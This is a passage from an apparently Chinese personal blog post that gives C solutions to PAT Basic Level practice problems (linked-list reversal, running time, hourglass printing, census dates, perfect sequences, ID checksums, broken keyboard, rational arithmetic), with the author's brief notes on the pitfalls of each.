&amp;n, &amp;k);</span><br><span class="line">List *<span class="built_in">list</span> = (List *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List)*n);</span><br><span class="line"><span class="built_in">memset</span>(<span class="built_in">list</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(List)*n);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>, &amp;<span class="built_in">list</span>[i].addr, &amp;<span class="built_in">list</span>[i].data, &amp;<span class="built_in">list</span>[i].next);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = i; j &lt; n; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">list</span>[j].addr == next)</span><br><span class="line">&#123;</span><br><span class="line">temp = <span class="built_in">list</span>[j];</span><br><span class="line"><span class="built_in">list</span>[j] = <span class="built_in">list</span>[i];</span><br><span class="line"><span class="built_in">list</span>[i] = temp;</span><br><span class="line"></span><br><span class="line">next = <span class="built_in">list</span>[i].next;</span><br><span class="line"><span class="keyword">if</span>(next == <span class="number">-1</span>)</span><br><span class="line">n = i+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i += k)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> l = i, r = i+k<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span>(r &gt;= n)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">while</span>(l &lt; r)</span><br><span class="line">&#123;</span><br><span class="line">temp = <span class="built_in">list</span>[l];</span><br><span class="line"><span class="built_in">list</span>[l] = <span class="built_in">list</span>[r];</span><br><span class="line"><span class="built_in">list</span>[r] = temp;</span><br><span class="line">l++, r--;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="keyword">if</span>(i == n<span class="number">-1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%05d %d -1\n"</span>, <span class="built_in">list</span>[i].addr, <span class="built_in">list</span>[i].data);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%05d %d %05d\n"</span>, <span class="built_in">list</span>[i].addr, <span class="built_in">list</span>[i].data, <span class="built_in">list</span>[i+<span class="number">1</span>].addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结：难。</strong></p><h3 id="1026-程序运行时间"><a href="#1026-程序运行时间" class="headerlink" title="1026 程序运行时间"></a>1026 程序运行时间</h3><p>这个题的条件：不足 1 秒的时间四舍五入到秒。硬是想了好久。🤣</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200710080352310.png" alt="image-20200710080352310"></p><p>后面发现，其实影响那个精度的在第一次除以CLK_TCK的时候，一个巧妙的办法就是除完后加0.5。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> h = <span class="number">0</span>, m = <span class="number">0</span>, s = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> c1 = <span class="number">0</span>, c2 = <span class="number">0</span>, tck = <span class="number">100</span>, ans = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;c1, &amp;c2);</span><br><span class="line">ans = (<span class="keyword">int</span>)((<span class="number">1.0</span>*(c2-c1)/<span class="number">100</span>+<span class="number">0.5</span>)); <span class="comment">//加0.5很巧妙的。</span></span><br><span class="line">h = ans/<span class="number">3600</span>;</span><br><span class="line">m = ans%<span class="number">3600</span>/<span class="number">60</span>;</span><br><span class="line">s = ans%<span class="number">3600</span>%<span class="number">60</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02d:%02d:%02d"</span>, h, m, s);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1027-打印沙漏"><a href="#1027-打印沙漏" class="headerlink" title="1027 打印沙漏"></a>1027 打印沙漏</h3><p>难点：一个高中数学问题，找规律求前等差数列前n项和。打印倒是简单。</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200710090155577.png" alt="image-20200710090155577"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> ch = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, i = <span class="number">0</span>, row = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %c"</span>, &amp;n, &amp;ch);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; ; i++)</span><br><span class="line"><span class="keyword">if</span>(<span class="number">2</span>*i*(i+<span class="number">2</span>)+<span class="number">1</span> &gt; n)</span><br><span class="line">&#123;</span><br><span class="line">row = i<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; row; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">' '</span>);</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; (row*<span class="number">2</span>+<span class="number">1</span>)<span class="number">-2</span>*i; j++)</span><br><span class="line"><span class="built_in">putchar</span>(ch);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; row+<span class="number">1</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; row-i; j++)</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">' '</span>);</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">2</span>*i+<span class="number">1</span>; j++)</span><br><span class="line"><span class="built_in">putchar</span>(ch);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, n-(<span class="number">2</span>*row*(row+<span class="number">2</span>)+<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结：第一次看到，感觉高中知识都忘完了。真的要好好学习大学高等数学。</strong></p><h3 id="1028-人口普查"><a href="#1028-人口普查" class="headerlink" title="1028 人口普查"></a>1028 人口普查</h3><p>这个题用之前上C语言课老师讲的联合位域来存储日期做很简单，但是还是被题目中的0条件卡了很久，这已经是很多次被PAT乙级的0条件卡了，这个条件真不能大意。</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200712095104672.png" alt="image-20200712095104672"></p><p>1.开始没有注意，在比较的人里开始不能以0为下标，因为0可能是不合法的人。2.当人数为0时，最后只输出一个0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> data_compare;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> day: <span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> month: <span class="number">4</span>;</span><br><span class="line"><span class="keyword">int</span> year: <span class="number">12</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> name[<span class="number">10</span>];</span><br><span class="line">Date date;</span><br><span class="line">&#125;People;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">max</span> = <span class="number">0</span>, <span class="built_in">min</span> = <span class="number">0</span>, i = <span class="number">0</span>, flag = <span class="number">1</span>;</span><br><span class="line">Date date1 = &#123;<span class="number">0</span>&#125;, date2 = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, year = <span class="number">0</span>, month = <span class="number">0</span>, day = <span class="number">0</span>, count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">People *people = (People *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(People)*n);</span><br><span class="line"><span class="built_in">memset</span>(people, <span class="number">0</span>, <span class="keyword">sizeof</span>(People)*n);</span><br><span class="line"></span><br><span class="line">date1.year = <span class="number">2014</span>, date1.month = <span class="number">9</span>, date1.day = <span class="number">6</span>;</span><br><span class="line">date2.year = <span class="number">1814</span>, date2.month = <span class="number">9</span>, date2.day = <span class="number">6</span>;</span><br><span class="line"><span class="keyword">while</span>(i &lt; n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s %d/%d/%d"</span>, people[i].name, &amp;year, &amp;month, &amp;day);</span><br><span class="line">people[i].date.year = year, people[i].date.month = month, people[i].date.day = day;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(people[i].date.data_compare &gt;= date2.data_compare &amp;&amp; people[i].date.data_compare &lt;= date1.data_compare)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(flag)</span><br><span class="line"><span class="built_in">max</span> = i, <span class="built_in">min</span> = i, flag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span>(people[<span class="built_in">max</span>].date.data_compare &gt; people[i].date.data_compare)</span><br><span class="line"><span class="built_in">max</span> = i;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(people[<span class="built_in">min</span>].date.data_compare &lt; people[i].date.data_compare)</span><br><span class="line"><span class="built_in">min</span> = i;</span><br><span class="line">&#125;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(count)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d %s %s"</span>, count, people[<span class="built_in">max</span>].name, people[<span class="built_in">min</span>].name);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结：这个方法比较日期大小真不错。</strong></p><h3 id="1030-完美数列"><a href="#1030-完美数列" class="headerlink" title="1030 完美数列"></a>1030 完美数列</h3><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200715124816207.png" alt="image-20200715124816207"></p><p>关键在于写循环时注意一个节省时间的技巧。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a, <span class="keyword">const</span> <span class="keyword">void</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> *(<span class="keyword">int</span> *)a - *(<span class="keyword">int</span> *)b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">double</span> p = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span> , a[<span class="number">100000</span>], i = <span class="number">0</span>, j = <span class="number">0</span>, <span class="built_in">max</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %lf"</span>, &amp;n, &amp;p);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, a+i);</span><br><span class="line"></span><br><span class="line">qsort(a, n, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), cmp);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = i+<span class="built_in">max</span>; j &lt; n; j++) <span class="comment">//这里每次从max开始。</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[j] &gt; a[i]*p)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">max</span> = j-i &gt; <span class="built_in">max</span> ? j-i : <span class="built_in">max</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(j == n<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">max</span> = j-i+<span class="number">1</span> &gt; <span class="built_in">max</span> ? j-i+<span class="number">1</span> : <span class="built_in">max</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, <span class="built_in">max</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结：遍历时注意能不能节省时间。</strong></p><h3 id="1031-查验身份证"><a href="#1031-查验身份证" class="headerlink" title="1031 查验身份证"></a>1031 查验身份证</h3><p>这道题看出，我对权重有误解。。。开始都去乘个0.01。。</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200715125137219.png" alt="image-20200715125137219"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, i = <span class="number">0</span>, flag = <span class="number">0</span>, sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> a[] = &#123;<span class="string">'1'</span>, <span class="string">'0'</span>, <span class="string">'X'</span>, <span class="string">'9'</span>, <span class="string">'8'</span>, <span class="string">'7'</span>, <span class="string">'6'</span>, <span class="string">'5'</span>, <span class="string">'4'</span>, <span class="string">'3'</span>, <span class="string">'2'</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> q[<span class="number">17</span>] = &#123;<span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">19</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">while</span>(n--)</span><br><span class="line">&#123;</span><br><span class="line">gets(s);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>, sum = <span class="number">0</span>; i &lt; <span class="number">17</span>; i++)</span><br><span class="line">sum += (s[i]<span class="number">-48</span>)*q[i];</span><br><span class="line">sum = sum%<span class="number">11</span>; </span><br><span class="line"><span class="keyword">if</span>(a[sum] != s[<span class="number">17</span>])</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s\n"</span>, s), flag = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!flag)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"All passed\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结：权重。。</strong></p><h3 id="1033-旧键盘打字"><a href="#1033-旧键盘打字" class="headerlink" title="1033 旧键盘打字"></a>1033 旧键盘打字</h3><p>关键是统计坏掉的键时注意一个字母坏了，与之对应的大写或小写都要置坏的标志位。这个还要开始就写，不然后面很麻烦。</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200715125333175.png" alt="image-20200715125333175"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">127</span>] = &#123;<span class="number">0</span>&#125;, i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">100001</span>] = &#123;<span class="number">0</span>&#125;, ch = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>((ch = getchar()) != <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(ch &gt;= <span class="number">65</span> &amp;&amp; ch &lt;= <span class="number">90</span>)</span><br><span class="line">a[ch]++, a[ch+<span class="number">32</span>]++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(ch &gt;= <span class="number">97</span> &amp;&amp; ch &lt;= <span class="number">122</span>)</span><br><span class="line">a[ch]++, a[ch<span class="number">-32</span>]++;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">a[ch]++; </span><br><span class="line">&#125;</span><br><span class="line">gets(s);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; s[i]; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[<span class="string">'+'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[s[i]] == <span class="number">0</span> &amp;&amp; (s[i] &lt; <span class="number">65</span> || s[i] &gt; <span class="number">90</span>))</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, s[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[s[i]] == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, s[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结：无。</strong></p><h3 id="1034-有理数四则运算"><a href="#1034-有理数四则运算" class="headerlink" title="1034 有理数四则运算"></a>1034 有理数四则运算</h3><p>我居然一直不知道分数的加减法可以直接写的，还在哪里通分后计算。。。</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200719110513337-1612066095067.png" alt="image-20200719110513337"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gcd</span><span class="params">(<span class="keyword">long</span> a, <span class="keyword">long</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(b == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Inf"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">long</span> a1 = a, b1 = b, c = <span class="number">0</span>, flag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(a1 &lt; <span class="number">0</span>)</span><br><span class="line">a1 *= <span class="number">-1</span>, a *= <span class="number">-1</span>, flag *= <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span>(b1 &lt; <span class="number">0</span>)</span><br><span class="line">b1 *= <span class="number">-1</span>, b *= <span class="number">-1</span>, flag *= <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span>(a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span>(b1)</span><br><span class="line">&#123;</span><br><span class="line">c = a1%b1;</span><br><span class="line">a1 = b1;</span><br><span class="line">b1 = c;</span><br><span class="line">&#125;</span><br><span class="line">a /= a1, b /= a1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag &lt; <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"(-"</span>);</span><br><span class="line"><span class="keyword">if</span>(a/b &amp;&amp; a%b)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%ld %ld/%ld"</span>, a/b, a%b, b);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a%b)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%ld/%ld"</span>, a%b, b);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%ld"</span>, 